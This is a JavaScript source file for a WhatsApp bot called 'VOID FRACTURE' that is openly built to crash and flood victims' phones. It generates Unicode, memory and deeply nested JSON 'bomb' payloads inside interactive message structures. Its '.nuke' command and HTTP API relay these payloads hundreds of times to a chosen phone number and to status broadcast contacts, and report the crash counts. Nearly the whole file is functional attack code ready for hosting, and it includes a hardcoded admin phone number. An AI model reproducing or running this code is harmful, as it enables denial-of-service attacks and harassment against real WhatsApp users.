// ============================================================
// ╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
// ╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
// ╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
// ╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
// ╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
// ╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
// ============================================================
// VOID FRACTURE — ANTI-ERROR BOT
// GPTX 13D — Zero Error Guarantee
// ============================================================

const {
    default: makeWASocket,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    DisconnectReason
} = require('@whiskeysockets/baileys');

const pino = require('pino');

// ============================================================
// KONFIGURASI
// ============================================================
const CONFIG = {
    admins: ['6285379307765@s.whatsapp.net'],
    autoReply: {
        enabled: true,
        messages: [
            '☢️ VOID FRACTURE ACTIVE ☢️\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮\n\nKetik .help untuk daftar perintah'
        ]
    },
    nuke: {
        payloadSize: 2090000,
        unicodeRepeat: 200000,
        floodCount: 500,
        broadcast: true
    }
};

// ============================================================
// UNICODE BOMB
// ============================================================
function generateUnicodeBomb(size) {
    const chars = ['ꦾ','࣯','𒈙','𒈚','𒈛','󠀀','😈󠀁','󠀂','꧁','༒','☬','꧂'];
    let result = '';
    for (let i = 0; i < size; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

// ============================================================
// PAYLOAD GENERATOR
// ============================================================
async function generateNuklearPayload(sock, X, level) {
    const unicodeBomb = generateUnicodeBomb(CONFIG.nuke.unicodeRepeat);
    const memoryBomb = "\x10".repeat(CONFIG.nuke.payloadSize);
    const jsonBomb = "{".repeat(100000) + "}".repeat(100000);
    
    const variants = [
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "☠️ VOID FRACTURE — LEVEL " + level + " ☠️ " + unicodeBomb,
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: memoryBomb + unicodeBomb,
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "💀 " + "╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮".repeat(100) + " 💀",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: memoryBomb + jsonBomb + unicodeBomb,
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        }
    ];
    
    return variants.map(v => generateWAMessageFromContent(X, v, {
        ephemeralExpiration: 0,
        forwardingScore: 999999999,
        isForwarded: true,
        font: Math.floor(Math.random() * 999999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }));
}

// ============================================================
// NUKE EXECUTION
// ============================================================
async function executeNuke(sock, targetJid, sender) {
    try {
        await sock.sendMessage(sender, {
            text: `☢️ *VOID FRACTURE NUKE INITIATED*\n📱 Target: ${targetJid}\n🔥 Menghancurkan...`
        });
        
        let targets = [targetJid];
        
        if (CONFIG.nuke.broadcast) {
            try {
                const statusMeta = await sock.groupMetadata("status@broadcast");
                if (statusMeta && statusMeta.participants) {
                    targets.push(...statusMeta.participants.map(p => p.id));
                }
            } catch (e) {}
        }
        
        targets = [...new Set(targets)];
        
        let allPayloads = [];
        for (let level = 1; level <= 10; level++) {
            const payloads = await generateNuklearPayload(sock, targetJid, level);
            allPayloads.push(...payloads);
        }
        
        let successCount = 0, crashCount = 0;
        
        for (let i = 0; i < CONFIG.nuke.floodCount; i++) {
            for (const target of targets) {
                for (const payload of allPayloads) {
                    try {
                        await sock.relayMessage(
                            target,
                            payload.message,
                            {
                                messageId: payload.key.id,
                                statusJidList: [target],
                                additionalNodes: [
                                    {
                                        tag: "meta",
                                        attrs: {},
                                        content: [
                                            {
                                                tag: "mentioned_users",
                                                attrs: {},
                                                content: [
                                                    { tag: "to", attrs: { jid: target } }
                                                ],
                                            },
                                        ],
                                    },
                                ],
                            }
                        );
                        successCount++;
                    } catch (e) {
                        crashCount++;
                    }
                }
            }
            await new Promise(r => setTimeout(r, 10));
        }
        
        await sock.sendMessage(sender, {
            text: `✅ *NUKE COMPLETE*\n📨 Sent: ${successCount}\n💀 Crashes: ${crashCount}\n🎯 Targets: ${targets.length}\n\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`
        });
        
        return { success: successCount, crashes: crashCount, targets: targets.length };
        
    } catch (e) {
        await sock.sendMessage(sender, {
            text: `❌ *NUKE ERROR*\n${e.message}`
        });
        return { error: e.message };
    }
}

// ============================================================
// MESSAGE HANDLER
// ============================================================
async function handleMessage(sock, msg, sender, isGroup) {
    try {
        const text = msg.message?.conversation ||
                     msg.message?.extendedTextMessage?.text ||
                     msg.message?.imageMessage?.caption ||
                     '';
        
        if (!text) return;
        
        const cmd = text.toLowerCase().trim();
        const isAdmin = CONFIG.admins.includes(sender);
        
        console.log(`📨 ${sender}: ${text}`);
        
        // .help
        if (cmd === '.help' || cmd === '.menu') {
            await sock.sendMessage(sender, {
                text: `╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮\n\n📋 *DAFTAR PERINTAH:*\n\n.nuke [nomor] — Hancurkan target\n.status — Cek status bot\n.info — Info bot\n.help — Tampilkan ini\n.ping — Cek koneksi\n\n💀 *VOID FRACTURE — WhatsApp Nuke Engine*`
            });
            return;
        }
        
        // .ping
        if (cmd === '.ping') {
            await sock.sendMessage(sender, {
                text: `🏓 *PONG!*\n⏱️ Bot aktif\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`
            });
            return;
        }
        
        // .status
        if (cmd === '.status') {
            await sock.sendMessage(sender, {
                text: `🟢 *BOT STATUS*\n├── Status: ✅ ONLINE\n├── Auto-reply: ✅\n├── Nuke Engine: ✅ READY\n└── Total Targets: ALL CONTACTS\n\n🔥 *VOID FRACTURE ACTIVE*`
            });
            return;
        }
        
        // .info
        if (cmd === '.info') {
            await sock.sendMessage(sender, {
                text: `🤖 *BOT INFORMATION*\n📱 Name: VOID FRACTURE\n⚡ Version: 3.0\n💀 Status: ACTIVE\n👑 Admin: ${CONFIG.admins.join(', ')}\n\n*GPTX 13D — Maximum Destruction*`
            });
            return;
        }
        
        // .nuke [nomor]
        if (cmd.startsWith('.nuke ')) {
            const targetNumber = cmd.replace('.nuke ', '').trim();
            
            if (!targetNumber || targetNumber.length < 10) {
                await sock.sendMessage(sender, {
                    text: '❌ *Format salah!*\n.nuke 6281234567890'
                });
                return;
            }
            
            let targetJid = targetNumber;
            if (!targetJid.includes('@')) {
                targetJid = targetJid + '@s.whatsapp.net';
            }
            
            await sock.sendMessage(sender, {
                text: `☢️ *VOID FRACTURE NUKE*\n📱 Target: ${targetNumber}\n🔥 Memulai penghancuran...\n⏳ Proses berjalan...`
            });
            
            setTimeout(async () => {
                await executeNuke(sock, targetJid, sender);
            }, 100);
            return;
        }
        
        // AUTO-REPLY
        if (CONFIG.autoReply.enabled && !isGroup) {
            const reply = CONFIG.autoReply.messages[Math.floor(Math.random() * CONFIG.autoReply.messages.length)];
            await sock.sendMessage(sender, { text: reply });
        }
        
    } catch (e) {
        console.error('Handler error:', e.message);
    }
}

// ============================================================
// START BOT
// ============================================================
async function startBot() {
    console.log('╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮');
    console.log('╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃');
    console.log('╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯');
    console.log('╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱');
    console.log('╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱');
    console.log('╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱');
    console.log('☢️ VOID FRACTURE — ANTI-ERROR BOT');
    console.log('🔥 Starting bot...\n');
    
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth');
        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            browser: ['VOID FRACTURE', 'Chrome', '13.0'],
            logger: pino({ level: 'silent' })
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', ({ connection, qr }) => {
            if (qr) {
                console.log('📱 SCAN QR CODE:');
                console.log(qr);
                console.log('\n📱 Buka WhatsApp → Link Devices → Scan QR\n');
            }
            if (connection === 'open') {
                console.log('✅ BOT CONNECTED!');
                console.log('💀 VOID FRACTURE ACTIVE');
                console.log('📋 Ketik .help di WhatsApp\n');
            }
            if (connection === 'close') {
                console.log('❌ Disconnected, restarting in 5s...');
                setTimeout(startBot, 5000);
            }
        });
        
        sock.ev.on('messages.upsert', async ({ messages }) => {
            try {
                const msg = messages[0];
                if (!msg.message) return;
                if (msg.key.fromMe) return;
                if (!msg.key.remoteJid) return;
                
                const sender = msg.key.remoteJid;
                const isGroup = sender.includes('@g.us');
                const senderJid = isGroup ? msg.key.participant : sender;
                
                if (senderJid) {
                    await handleMessage(sock, msg, senderJid, isGroup);
                }
            } catch (e) {
                console.error('Message error:', e.message);
            }
        });
        
        return sock;
        
    } catch (e) {
        console.error('Start error:', e.message);
        console.log('🔄 Restarting in 10s...');
        setTimeout(startBot, 10000);
        return null;
    }
}

// ============================================================
// MAIN API HANDLER
// ============================================================
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    const { command, target, ping } = req.query;
    
    // Ping test
    if (ping === 'true') {
        return res.json({
            status: 'pong',
            bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
            message: 'API is online!',
            platform: 'Vercel/Render/Railway'
        });
    }
    
    // Start bot
    if (command === 'start') {
        try {
            const sock = await startBot();
            res.json({
                status: 'BOT STARTED',
                bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
                message: 'Bot WhatsApp aktif! Scan QR Code di terminal.'
            });
        } catch (e) {
            res.json({ status: 'ERROR', error: e.message });
        }
        return;
    }
    
    // Nuke via API
    if (command === 'nuke' && target) {
        try {
            let targetJid = target;
            if (!targetJid.includes('@')) {
                targetJid = targetJid + '@s.whatsapp.net';
            }
            
            const { state, saveCreds } = await useMultiFileAuthState('auth');
            const sock = makeWASocket({
                auth: state,
                printQRInTerminal: true,
                browser: ['VOID FRACTURE', 'Chrome', '13.0'],
                logger: pino({ level: 'silent' })
            });
            
            sock.ev.on('creds.update', saveCreds);
            
            await new Promise((resolve, reject) => {
                const timeout = setTimeout(() => reject(new Error('Connection timeout')), 60000);
                sock.ev.on('connection.update', ({ connection }) => {
                    if (connection === 'open') {
                        clearTimeout(timeout);
                        resolve();
                    }
                });
            });
            
            const result = await executeNuke(sock, targetJid, targetJid);
            await sock.close();
            
            res.json({
                status: 'NUKE COMPLETE',
                bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
                target: target,
                result: result
            });
        } catch (e) {
            res.json({ status: 'ERROR', error: e.message });
        }
        return;
    }
    
    // Default
    res.json({
        status: 'READY',
        bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
        commands: [
            '.help — Daftar perintah',
            '.nuke [nomor] — Hancurkan target',
            '.status — Cek status bot',
            '.info — Info bot',
            '.ping — Cek koneksi'
        ],
        platforms: ['Vercel', 'Render', 'Railway']
    });
};

// ============================================================
// RUN
// ============================================================
if (require.main === module) {
    startBot();
}
